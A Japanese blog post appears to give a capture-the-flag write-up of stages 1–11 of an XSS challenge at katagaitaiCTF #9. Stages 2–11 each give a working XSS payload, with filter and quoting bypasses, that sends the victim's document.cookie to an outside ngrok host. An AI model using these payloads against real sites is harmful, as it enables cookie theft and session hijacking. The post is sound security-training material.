---
layout: post
date: 2017-08-28
title: katagaitaiCTF#9 xss千本ノック write up
tags: [katagaitaiCTF, katagaitaiCTF#9, xss, xss千本ノック, write up]
excerpt: 8月27日に秋葉原で開かれたkatagaitaiCTFに参加してきました。そこで行われたxss千本ノックのwrite upです。

---

8月27日に秋葉原で開かれたkatagaitaiCTFに参加してきました。  
そこで行われたxss千本ノックのwrite upです。

12~43問までのwrite upはhfukudaさんがアップしています。  
[katagaitai CTF勉強会 #9 writeup(Webパート)](http://0x90.hatenablog.jp/entry/2017/08/27/201021)  

[Flask](http://flask.pocoo.org/)を使って適当にサーバを建てて[ngrok](https://ngrok.com/)を使って外部に公開してクッキーを取っていきました。  


#### Stage1/Sanity Check

> Welcome to Senbon XSS!  
> In this stage, just submit the flag `FLAG{waiwai_xss}` to the FLAG form.  
> If you submit a URL to the URL form, the victime browser will automatically access the URL.  
  
ということのなのコピーして貼り付けるだけ。


#### Stage2/Sanity Check
+がurlデコードされるから%2bにして投げる。
```
/?q=<script>location.href="http://b5236666.ngrok.io?c="%2bdocument.cookie;</script>
```

#### Stage3/Sanity Check
タグを閉じてスクリプトを埋め込む。
```
/?q="><script>location.href="http://b5236666.ngrok.io?c="%2bdocument.cookie;</script>
```

#### Stage4/Sanity Check
textareaタグを閉じてスクリプトを埋め込む。
```
/?q=</textarea><script>location.href="http://b5236666.ngrok.io?c="%2bdocument.cookie;</script><textarea>
```

#### Stage5/Sanity Check
value属性を閉じて、inputタグにフォーカスが当たったときにスクリプトを走らせます。  
ただ、このままでは即時実行出来ないので`autofocus`属性を使い最初からフォーカスを当てるようにします。
```
/?q="%20autofocus%20onfocus="location.href='http://b5236666.ngrok.io?c='%2bdocument.cookie;"
```

#### Stage6/Sanity Check
シングルクォートしか使えないので、代わりにES6から導入されたテンプレートリテラルを使用すます。
```
/?q='%20autofocus%20onfocus='location.href=`http://b5236666.ngrok.io?c=${document.cookie}`;'
```

#### Stage7/Sanity Check
今回もテンプレートリテラルを使っていく。
```
/?q=value%20autofocus%20onfocus=location.href=`http://b5236666.ngrok.io?c=${document.cookie}`;
```

#### Stage8/Sanity Check
iframeタグのsrcに直接スクリプトを書く。
```
/?q=javascript:location.href=`http://b5236666.ngrok.io?c=${document.cookie}`;
```

#### Stage9/Sanity Check
scriptタグを埋め込みます。
```
/?q=<script>location.href=`http://b5236666.ngrok.io?c=${document.cookie}`;</script>
```

#### Stage10/Sanity Check
いろいろできるんだけど、chromeのxssフィルターに引っかかりまくった…  
hfukudaさんのwrite upをみて解けた。
```
/?q=<img%20src=x%20oscriptnerror=location.href="http://b5236666.ngrok.io?c="%2bdocument.cookie;>
```

#### Stage11/Sanity Check
Stage10といっしょ。
```
/?q=<img%20src=x%20oscriptnerror=location.href="http://b5236666.ngrok.io?c="%2bdocument.cookie;>
```

